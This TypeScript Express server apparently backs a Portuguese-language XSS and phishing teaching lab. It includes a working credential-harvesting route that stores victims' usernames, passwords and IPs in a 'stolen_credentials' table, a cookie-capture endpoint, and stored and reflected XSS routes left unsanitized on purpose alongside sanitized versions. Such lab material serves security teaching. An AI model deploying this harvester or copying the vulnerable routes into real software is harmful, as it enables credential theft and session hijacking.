import express, { Request, Response } from "express";
import cors from "cors";
import dotenv from "dotenv";
import db from "./db";
import path from "path";
import sanitizeHtml from "sanitize-html";
import cookieParser from "cookie-parser";
import bodyParser from "body-parser";

// Carrega variáveis de ambiente
dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware para processar JSON
app.use(express.json());
// Middleware para processar forms (login phishing)
app.use(bodyParser.urlencoded({ extended: true }));

// CORS
app.use(cors({
  origin: "http://localhost:3000",
  credentials: true
}));

// Cookie parser
app.use(cookieParser());

/**
 * Rota de phishing SIGA
 * Recebe usuário/senha do form e armazena em stolen_credentials
 */
app.post("/siga-login", async (req: Request, res: Response) => {
  const { username, password } = req.body as {
    username: string;
    password: string;
  };

  // Captura IP real (se atrás de proxy, usar X-Forwarded-For)
  const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0]
           || req.socket.remoteAddress
           || "unknown";
  const accessedAt = new Date();

  try {
    await db.query(
      `INSERT INTO stolen_credentials (username, password, ip, accessed_at)
       VALUES ($1, $2, $3, $4)`,
      [username, password, ip, accessedAt]
    );
    console.log(
      `⚠️ Capturado: ${username} / ${password} | IP: ${ip} | ${accessedAt.toISOString()}`
    );
  } catch (err) {
    console.error("Erro ao salvar credenciais:", err);
  }

  // Responde com página genérica de falha de login
  res.send(`
    <html>
      <body>
        <p>Usuário ou senha inválidos. <a href="/siga.html">Tentar novamente</a></p>
      </body>
    </html>
  `);
});


// Rota de login real para Exercício 3 (cookie HttpOnly)
app.post("/login", (req: Request, res: Response) => {
  // validação omitida...
  res
    .cookie("token", "exer02servidor", {
      httpOnly: true,
      secure: false,
      sameSite: "strict",
      path: "/"
    })
    .json({ mensagem: "Autenticado com sucesso" });
});

// Serve estáticos (inclui public/siga.html, exercices etc.)
app.use(express.static("public"));

// Rotas de exercícios e XSS armazenado/refletido
app.get("/stored-xss", (_req, res) =>
  res.sendFile(path.join(__dirname, "..", "public", "stored-xss.html"))
);
app.get("/dom-xss", (_req, res) =>
  res.sendFile(path.join(__dirname, "..", "public", "dom-based-xss.html"))
);
app.get("/dom-xss-sanitize", (_req, res) =>
  res.sendFile(path.join(__dirname, "..", "public", "dom-based-xss-sanitize.html"))
);
app.get("/exercicio1-vulneravel", (_req, res) =>
  res.sendFile(path.join(__dirname, "..", "public", "exercicio1-vulneravel.html"))
);
app.get("/exercicio1-resposta", (_req, res) =>
  res.sendFile(path.join(__dirname, "..", "public", "exercicio1-resposta.html"))
);
app.get("/exercicio2-vulneravel", (_req, res) =>
  res.sendFile(path.join(__dirname, "..", "public", "exercicio2-vulneravel.html"))
);
app.get("/exercicio2-resposta", (_req, res) =>
  res.sendFile(path.join(__dirname, "..", "public", "exercicio2-resposta.html"))
);
app.get("/exercicio3-resposta", (_req, res) =>
  res.sendFile(path.join(__dirname, "..", "public", "exercicio3-resposta.html"))
);
app.get("/exercicio4-vulneravel", (_req, res) =>
  res.sendFile(path.join(__dirname, "..", "public", "exercicio4-vulneravel.html"))
);

// STORED XSS
app.post("/comment", (req, res) => {
  const comment = req.body.comment;
  db.query("INSERT INTO comments (text) VALUES ($1)", [comment]);
  res.json({ message: "Comentário adicionado!" });
});
app.get("/comments", async (_req, res) => {
  const result = await db.query("SELECT text FROM comments");
  res.header("Content-Type", "text/html");
  res.send(result.rows.map(r => `<div>${r.text}</div>`).join(""));
});
app.post("/comment-sanitize", (req, res) => {
  const sanitized = sanitizeHtml(req.body.comment, { allowedTags: [], allowedAttributes: {} });
  db.query("INSERT INTO comments_sanitize (text) VALUES ($1)", [sanitized]);
  res.json({ message: "Comentário adicionado com segurança!" });
});
app.get("/comments-sanitize", async (_req, res) => {
  const result = await db.query("SELECT text FROM comments_sanitize");
  res.header("Content-Type", "text/html");
  res.send(result.rows.map(r => `<div>${r.text}</div>`).join(""));
});

// REFLECTED XSS
app.get("/search", (req, res) => {
  res.send(`
    <html><body>
      <h3>Resultados da busca:</h3>
      <p>Você pesquisou por: ${req.query.q}</p>
    </body></html>
  `);
});
app.get("/search-sanitize", (req, res) => {
  const clean = sanitizeHtml(req.query.q as string, { allowedTags: [], allowedAttributes: {} });
  res.send(`
    <html><body>
      <h3>Resultados da busca:</h3>
      <p>Você pesquisou por: ${clean}</p>
    </body></html>
  `);
});

// EXERCÍCIO 1 – simula cookie roubado
app.get("/exercicio1-server", (req, res) => {
  console.log("Cookie capturado:", req.query.c);
  res.send("");
});

// EXERCÍCIO 2 – vulnerável a XSS
app.post("/exercicio2", (req, res) => {
  const { name, description } = req.body;
  db.query("INSERT INTO profiles (name, description) VALUES ($1, $2)", [name, description]);
  res.json({ message: "Perfil criado!" });
});
app.get("/exercicio2", async (_req, res) => {
  const result = await db.query("SELECT name, description FROM profiles");
  res.json(result.rows);
});

// EXERCÍCIO 3 – cookie HttpOnly
app.get("/exercicio3-login", (_req, res) => {
  res.cookie("exer03", "exer03servidor", {
    httpOnly: true,
    path: "/",
    sameSite: "strict",
    secure: false
  });
  res.send({ mensagem: "Cookie HttpOnly enviado com sucesso." });
});

// Inicia servidor
app.listen(PORT, () => {
  console.log(`Servidor rodando em http://localhost:${PORT}`);
});
